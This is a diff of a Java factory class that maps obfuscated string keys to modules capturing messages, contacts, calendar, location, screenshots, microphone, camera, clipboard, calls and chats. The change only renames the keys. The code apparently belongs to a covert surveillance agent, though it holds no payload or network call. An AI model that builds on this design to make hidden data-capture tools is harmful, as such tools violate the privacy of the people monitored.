@@ -28,33 +28,33 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	public BaseModule create(String type, String subtype) {
 		BaseModule a = new NullModule();
 
-		if (Messages.getString("c.0").equals(type)) { //$NON-NLS-1$
+		if (Messages.getString("c_0").equals(type)) { //$NON-NLS-1$
 			a = new ModuleMessage();
-		} else if (Messages.getString("c.1").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_1").equals(type)) { //$NON-NLS-1$
 			a = new ModuleAddressBook();
-		} else if (Messages.getString("c.2").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_2").equals(type)) { //$NON-NLS-1$
 			a = new ModuleCalendar();
-		} else if (Messages.getString("c.4").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_4").equals(type)) { //$NON-NLS-1$
 			a = new ModuleDevice();
-		} else if (Messages.getString("c.5").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_5").equals(type)) { //$NON-NLS-1$
 			a = new ModulePosition();
-		} else if (Messages.getString("c.6").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_6").equals(type)) { //$NON-NLS-1$
 			a = new ModuleSnapshot();
-		} else if (Messages.getString("c.7").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_7").equals(type)) { //$NON-NLS-1$
 			a = new ModuleMessage();
-		} else if (Messages.getString("c.8").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_8").equals(type)) { //$NON-NLS-1$
 			a = new ModuleMic();
-		} else if (Messages.getString("c.9").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_9").equals(type)) { //$NON-NLS-1$
 			a = new ModuleCamera();
-		} else if (Messages.getString("c.10").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_10").equals(type)) { //$NON-NLS-1$
 			a = new ModuleClipboard();
-		} else if (Messages.getString("c.11").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_11").equals(type)) { //$NON-NLS-1$
 			a = new ModuleCrisis();
-		} else if (Messages.getString("c.12").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_12").equals(type)) { //$NON-NLS-1$
 			a = new ModuleApplication();
-		} else if (Messages.getString("c.13").equals(type)) { //$NON-NLS-1$
+		} else if (Messages.getString("c_13").equals(type)) { //$NON-NLS-1$
 			a = new ModuleCall();
-		}else if (Messages.getString("c.14").equals(type)) { //$NON-NLS-1$
+		}else if (Messages.getString("c_14").equals(type)) { //$NON-NLS-1$
 			a = new ModuleChat();
 		} else {
 			if (Cfg.DEBUG) {
